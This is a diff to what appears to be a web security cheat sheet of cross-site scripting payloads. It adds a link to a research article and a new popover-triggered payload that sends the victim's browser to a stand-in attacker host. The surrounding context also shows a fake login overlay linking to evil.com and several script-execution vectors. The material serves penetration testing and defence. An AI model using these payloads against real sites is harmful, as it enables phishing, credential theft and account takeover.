@@ -2892,6 +2892,7 @@ Manually testing for XXE vulnerabilities generally involves
     <div style="background-color:white;position:fixed;width:100%;height:100%;top:0px;left:0px;z-index:1000;margin: auto;padding: 10px;"><p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a></div>
     ```
 - [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
+  - See also this article: ["Exploiting XSS in hidden inputs and meta tags" by Gareth Heyes](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)
 - For **mobile applications**: try to use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
 - [XSS Without parentheses](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
 - iframe + base64 encoded SVG 
@@ -2981,6 +2982,7 @@ http://foo?&apos;-alert(1)-&apos;
 ${alert(1)}
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
 '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+<button popovertarget=x>CLICKME</button><input type="text" readonly="readonly" id="x" popover onbeforetoggle=window.location.replace('http:attacker.com') />
 ```
 
 #### <ins>XSS -> ATO Escalation</ins> [[Reference](https://twitter.com/Rhynorater/status/1682401924635566080)]
